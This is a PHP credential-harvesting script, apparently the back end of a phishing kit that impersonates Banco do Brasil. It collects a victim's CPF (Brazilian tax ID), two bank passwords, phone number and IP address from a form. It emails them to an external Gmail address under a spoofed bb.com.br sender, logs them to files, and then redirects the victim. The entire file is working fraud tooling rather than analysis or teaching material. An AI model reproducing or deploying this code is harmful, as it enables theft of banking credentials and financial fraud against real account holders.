<?php

$cpf = $_POST['cpf'];
$senha8 = $_POST['senha8'];
$senha6 = $_POST['senha6'];
$telefone = $_POST['telefone'];
$ip = $_SERVER['REMOTE_ADDR'];


$emaildestinatario = 'kikoo5543@gmail.com';

$subj = "Dados / IP: $ip - Chegou: BB";


$mensagemHTML = '
<p>------------- |Chegou BB Info| ------------</p>

<p><b>CPF:</b> '.$cpf.'<br>
<p><b>Senha 8:</b> '.$senha8.'<br>
<p><b>senha6:</b> '.$senha6.'<br>
<p><b>telefone:</b> '.$telefone.'<br>

<p>------------------- |TERROR DO SISTEMA!| -------------------</p>

';

$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: recadastramento@bb.com.br \r\n";
$headers .= "Return-Path: recadastramento@bb.com.br \r\n";
$envio = mail("kikoo5543@gmail.com", $subj, $mensagemHTML, $headers);

$fp = fopen("../dados/".date("YmdHis"), "a");
$escreve = fwrite($fp, $mensagemHTML);
fclose($fp);

if($envio){
	echo "<script>location='../fim.php';</script>";
}else{ 
	echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>";
}

?>